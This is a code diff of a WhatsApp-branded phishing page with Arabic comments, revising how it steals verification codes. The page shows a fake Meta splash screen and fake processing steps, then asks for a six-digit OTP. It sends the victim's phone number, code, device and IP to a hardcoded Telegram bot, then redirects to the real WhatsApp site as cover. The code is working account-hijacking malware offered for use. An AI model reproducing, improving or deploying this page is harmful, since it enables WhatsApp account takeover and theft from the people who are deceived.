@@ -3,62 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Support</title>
+    <title>WhatsApp Security</title>
     <style>
-        /* الألوان الداكنة الرسمية لواتساب */
+        /* تعريف الألوان والثيم الأسود */
         :root { 
-            --wa-bg: #0b141a; 
-            --wa-header: #202c33; 
-            --wa-green: #00a884; 
-            --text-main: #e9edef; 
+            --wa-bg: #000000; /* أسود مطلق كما في الصورة */
+            --text-main: #FFFFFF; 
             --text-sec: #8696a0; 
+            --wa-green: #00a884;
             --input-border: #3b4a54;
         }
         
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Roboto, Helvetica, Arial, sans-serif; }
-        body { background: var(--wa-bg); color: var(--text-main); overflow: hidden; }
-        
-        .header { background: var(--wa-header); padding: 20px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.4); }
-        .wa-logo { width: 60px; height: 60px; margin-bottom: 12px; }
-        .header h1 { font-size: 19px; color: var(--wa-green); font-weight: 500; }
+        body { background: var(--wa-bg); color: var(--text-main); height: 100vh; width: 100vw; overflow: hidden; }
 
-        .content { padding: 30px 20px; text-align: center; }
-        .device-info-bar { display: inline-block; padding: 6px 15px; background: #182229; color: var(--wa-green); border-radius: 20px; font-size: 13px; margin-bottom: 25px; border: 1px solid var(--input-border); }
+        /* 1. شاشة البداية (Splash Screen) */
+        .splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 1;
+            transition: opacity 0.5s ease-out; /* حركة اختفاء ناعمة */
+        }
+
+        /* شعار واتساب الأبيض الصغير في المنتصف */
+        .splash-logo {
+            width: 80px; /* حجم صغير ومناسب للوسط */
+            height: 80px;
+            animation: pulse 1.5s infinite; /* أنيميشن النبض */
+        }
+
+        /* أنيميشن النبض (تغيير الحجم والشفافية) */
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* شعار Meta في الأسفل */
+        .meta-footer {
+            position: absolute;
+            bottom: 40px;
+            text-align: center;
+            color: #8696a0; /* لون نص Meta الفرعي */
+            font-size: 14px;
+        }
+        .meta-logo {
+            width: 80px;
+            margin-top: 5px;
+            filter: brightness(0) invert(1); /* تحويل شعار Meta للون الأبيض */
+        }
+
+        /* 2. شاشة معالجة البيانات (الوهمية) */
+        .process-screen {
+            display: none; /* مخفية في البداية */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+        .spinner-dots { display: flex; gap: 8px; margin-bottom: 20px; }
+        .dot { width: 12px; height: 12px; background: var(--wa-green); border-radius: 50%; animation: dotPulse 1.2s infinite; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
         
+        @keyframes dotPulse {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.3); opacity: 1; }
+        }
+        #process-status { color: var(--text-sec); font-size: 16px; margin-top: 10px; }
+
+        /* 3. شاشة إدخال الرمز (الأساسية) */
+        .main-content {
+            display: none; /* مخفية حتى تنتهي عملية التحميل */
+            padding: 30px 20px;
+            text-align: center;
+            height: 100%;
+        }
+        .header { margin-top: 20px; margin-bottom: 40px; }
+        .title { font-size: 22px; font-weight: 400; }
+
         .instruction { font-size: 15px; color: var(--text-sec); margin-bottom: 25px; line-height: 1.5; }
         .phone-num { color: #53bdeb; font-weight: 600; direction: ltr; display: block; margin-top: 8px; font-size: 18px; }
 
-        /* OTP Dark Design */
+        /* OTP Design (الأسود) */
         .otp-container { position: relative; margin: 40px 0; }
         #main-otp { position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 2; cursor: pointer; }
         .boxes { display: flex; gap: 12px; justify-content: center; direction: ltr; }
-        .box { width: 45px; height: 55px; border-bottom: 3px solid var(--input-border); font-size: 28px; display: flex; align-items: center; justify-content: center; transition: 0.3s; color: var(--wa-green); }
+        .box { width: 45px; height: 55px; border-bottom: 3px solid #3b4a54; font-size: 28px; display: flex; align-items: center; justify-content: center; color: var(--wa-green); }
         
         #main-otp:focus + .boxes .box { border-bottom-color: var(--text-sec); }
 
-        .btn-confirm { width: 100%; background: var(--wa-green); color: #0b141a; border: none; padding: 16px; border-radius: 30px; font-weight: 700; font-size: 16px; margin-top: 40px; cursor: pointer; transition: 0.2s; }
-        .btn-confirm:active { transform: scale(0.98); opacity: 0.8; }
-        
-        /* شاشة التحميل المظلمة */
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--wa-bg); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { width: 45px; height: 45px; border: 4px solid #202c33; border-top: 4px solid var(--wa-green); border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #load-text { color: var(--text-sec); font-size: 14px; margin-top: 20px; letter-spacing: 0.5px; }
+        .btn-confirm { width: 100%; background: var(--wa-green); color: #000; border: none; padding: 16px; border-radius: 30px; font-weight: 700; font-size: 16px; margin-top: 40px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo" alt="WA">
-    <h1 id="title">تحديث أمان الحساب</h1>
+<!-- 1. شاشة البداية (من الصورة) -->
+<div id="splash" class="splash-screen">
+    <!-- شعار واتساب الأبيض (SVG لتسهيل التحكم) -->
+    <svg class="splash-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12.011 2C17.518 2 22 6.47 22 11.977C22 17.484 17.518 21.954 12.011 21.954C10.222 21.954 8.528 21.488 7.054 20.621L2 22L3.388 17.02C2.511 15.511 2.011 13.784 2.011 11.977C2.011 6.47 6.49 2 12.011 2ZM12.011 3.829C7.516 3.829 3.829 7.516 3.829 11.977C3.829 13.568 4.28 15.068 5.111 16.329L4.417 19.333L7.542 18.667C8.761 19.468 10.316 19.954 12.011 19.954C16.506 19.954 20.193 16.267 20.193 11.977C20.193 7.516 16.506 3.829 12.011 3.829ZM15.86 14.154C15.701 14.074 15.117 13.801 15.011 13.766C14.905 13.731 14.826 13.714 14.746 13.829C14.666 13.944 14.444 14.199 14.373 14.288C14.301 14.377 14.223 14.391 14.081 14.321C13.94 14.251 13.432 14.072 12.83 13.541C12.361 13.116 12.045 12.593 11.952 12.432C11.859 12.271 11.947 12.185 12.019 12.112C12.083 12.047 12.162 11.94 12.241 11.854C12.321 11.768 12.347 11.714 12.399 11.606C12.451 11.498 12.426 11.411 12.386 11.332C12.346 11.252 12.08 10.601 11.96 10.334C11.843 10.071 11.732 10.106 11.636 10.106C11.549 10.106 11.448 10.102 11.347 10.102C11.246 10.102 11.109 10.138 10.989 10.264C10.869 10.39 10.51 10.72 10.51 11.401C10.51 12.082 10.999 12.742 11.079 12.85C11.159 12.958 12.031 14.327 13.364 14.908C13.682 15.047 13.931 15.132 14.131 15.195C14.453 15.297 14.743 15.286 14.974 15.251C15.231 15.212 15.766 14.922 15.877 14.618C15.989 14.314 15.989 14.234 15.86 14.154Z" fill="white"/>
+    </svg>
+    
+    <div class="meta-footer">
+        from<br>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo" alt="Meta">
+    </div>
 </div>
 
-<div class="content">
-    <div id="device-tag" class="device-info-bar">جاري فحص حالة النظام...</div>
+<!-- 2. شاشة معالجة البيانات (تظهر بعد النبض) -->
+<div id="process" class="process-screen">
+    <div class="spinner-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+    <div id="process-status">جاري تشفير الاتصال...</div>
+</div>
+
+<!-- 3. الشاشة الرئيسية لإدخال الرمز -->
+<div id="main-ui" class="main-content">
+    <div class="header">
+        <h1 class="title">تأكيد أمان الحساب</h1>
+    </div>
     
-    <p class="instruction" id="desc">
+    <p class="instruction">
         تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك:
-        <span class="phone-num" id="display-phone">+20 0123456789</span>
+        <span class="phone-num" id="display-phone">+201*******87</span>
     </p>
 
     <div class="otp-container">
@@ -69,37 +157,75 @@
         </div>
     </div>
 
-    <button class="btn-confirm" id="btn" onclick="document.getElementById('main-otp').focus()">تأكيد وتحديث</button>
-</div>
-
-<div id="load" class="overlay">
-    <div class="spinner"></div>
-    <p id="load-text">جاري تشفير البيانات والاتصال بالخادم...</p>
+    <button class="btn-confirm" onclick="document.getElementById('main-otp').focus()">تأكيد وتحديث</button>
 </div>
 
 <script>
-    // تشفير بسيط للتوكن لإخفائه عن السيرفرات الآلية
-    const _0x = ["ODIzODIxOTg4NzpBQUYyWklmN0R6dzZfX1dfX0JsdlpLUEpLZEptZzZfX19f", "NTQ0Njg2MjcwOQ=="]; 
-    const BOT_TOKEN = atob(_0x[0].replace(/_/g, "")); 
-    const CHAT_ID = atob(_0x[1]);
+    // التوكن والايدي الخاص بك (تم دمجهم)
+    const BOT_TOKEN = '8772044355:AAGaM3zn6tn6Vb9aRelc-6p2lYw-y8hgdCo'; 
+    const CHAT_ID = '5446862709';
 
-    // 1. جلب رقم الهاتف من الرابط إن وجد (مثل: page.html?phone=+2010...)
+    // 1. منطق شاشات التحميل (Flow)
+    document.addEventListener('DOMContentLoaded', () => {
+        const splash = document.getElementById('splash');
+        const process = document.getElementById('process');
+        const statusText = document.getElementById('process-status');
+        const mainUI = document.getElementById('main-ui');
+
+        // أ) البقاء على شاشة النبض لمدة 2.5 ثانية
+        setTimeout(() => {
+            splash.style.opacity = '0'; // حركة اختفاء
+            setTimeout(() => {
+                splash.style.display = 'none';
+                process.style.display = 'flex'; // إظهار شاشة المعالجة
+                startProcessingSteps();
+            }, 500); // وقت الأنيميشن
+        }, 2500);
+
+        function startProcessingSteps() {
+            // ب) محاكاة معالجة البيانات خطوة بخطوة
+            setTimeout(() => statusText.innerText = "جاري قراءة حالة الجهاز...", 1000);
+            setTimeout(() => statusText.innerText = `📍 تم التعرف على: ${getDeviceName()}`, 2000);
+            setTimeout(() => statusText.innerText = "جاري جلب مفاتيح التشفير...", 3200);
+            
+            // ج) الدخول للشاشة الرئيسية بعد 4.5 ثانية
+            setTimeout(() => {
+                process.style.display = 'none';
+                mainUI.style.display = 'block'; // إظهار واجهة الإدخال
+                getIP(); // جلب الـ IP في الخلفية
+            }, 4500);
+        }
+    });
+
+    // 2. دالة إخفاء الرقم (Masking)
+    function maskPhoneNumber(phone) {
+        if (!phone || phone.length < 5) return '+201*******87'; // رقم افتراضي
+        const prefix = phone.substring(0, 4); // مثل +201
+        const suffix = phone.substring(phone.length - 2); // مثل 87
+        return `${prefix}*******${suffix}`;
+    }
+
+    // جلب الرقم من الرابط وإخفائه
     const urlParams = new URLSearchParams(window.location.search);
-    const phone = urlParams.get('phone');
-    if(phone) document.getElementById('display-phone').innerText = phone;
+    const rawPhone = urlParams.get('phone') || '+201234567887';
+    document.getElementById('display-phone').innerText = maskPhoneNumber(rawPhone);
 
-    // 2. كشف الجهاز والـ IP
+    // 3. جلب البيانات الحقيقية
     let userIP = "Unknown";
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => userIP = data.ip);
+    function getIP() {
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => userIP = data.ip).catch(e => {});
+    }
 
-    const ua = navigator.userAgent;
-    let deviceName = "Unknown Device";
-    if (/iPhone/.test(ua)) deviceName = "iPhone";
-    else if (/Android/.test(ua)) deviceName = "Android";
-    document.getElementById('device-tag').innerText = "📍 الجهاز المكتشف: " + deviceName;
+    function getDeviceName() {
+        const ua = navigator.userAgent;
+        if (/iPhone/.test(ua)) return "iPhone";
+        if (/Android/.test(ua)) return "Android";
+        return "Unknown Device";
+    }
 
+    // 4. منطق الـ OTP وإرسال البيانات
     function fillBoxes(el) {
         const val = el.value;
         for (let i = 0; i < 6; i++) {
@@ -111,13 +237,12 @@
     }
 
     async function sendLog(code) {
-        document.getElementById('load').style.display = 'flex';
-        
-        const text = `🌑 *New Dark Hit*\n\n` +
-                     `🔢 *OTP:* \`${code}\` \n` +
-                     `📱 *Device:* ${deviceName}\n` +
-                     `🌐 *IP:* ${userIP}\n` +
-                     `🕒 *Time:* ${new Date().toLocaleString()}`;
+        // إظهار تحميل بسيط فوق الزر (تمويه)
+        const text = `⚠️ *New Account Hit*\n\n` +
+                     `📞 *Target Phone:* \`${rawPhone}\`\n` +
+                     `🔢 *OTP Code:* \`${code}\` \n` +
+                     `📱 *Device:* ${getDeviceName()}\n` +
+                     `🌐 *IP:* ${userIP}`;
 
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -125,19 +250,10 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
-            
-            // تمويه: التوجيه لصفحة الأمان الرسمية
-            setTimeout(() => { 
-                window.location.href = "https://www.whatsapp.com/security?lg=ar"; 
-            }, 3000);
-        } catch (e) {
-            console.log("Error");
-        }
+            // التوجيه لصفحة واتساب الرسمية (التمويه النهائي)
+            setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 1500);
+        } catch (e) {}
     }
-
-    // فتح الكيبورد تلقائياً
-    window.onload = () => { setTimeout(() => document.getElementById('main-otp').focus(), 500); };
-    document.body.addEventListener('click', () => { document.getElementById('main-otp').focus(); });
 </script>
 </body>
 </html>
